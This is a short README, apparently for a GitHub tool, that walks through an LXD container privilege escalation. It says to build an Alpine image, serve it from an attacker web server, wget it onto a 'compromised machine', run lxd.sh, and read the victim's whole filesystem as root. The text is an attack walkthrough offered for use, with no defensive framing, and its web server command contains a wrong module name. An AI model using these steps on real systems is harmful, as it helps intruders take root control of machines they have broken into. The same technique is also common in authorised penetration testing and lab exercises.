# 1- Clone this repo  git clone "https://github.com/CyberJunnkie/LXDAutoPrivilegeEscalator.git"

# 2- chmod +x install.sh 

# 3- run the install script to install alpine container
        
     ./install.sh

# 4- You will see a new directory named lxd-alpine-container

# 5- cd into it and you will see a tar file. Copy this file into the previous directory


# 6- Now host  a web server on the repo directory where you have your tar file and lxd.sh file

      python3 -m simple.http 80

# 7- Now on the compromised machine wget the both files as shown in demo video 


# 8- chmod +x lxd.sh

# 9- Now run the exploit as follows 
    
     ./lxd.sh <tarfile>


# 10- now just cd /mnt/root and you will have the entire filesystem of victim as root  
 
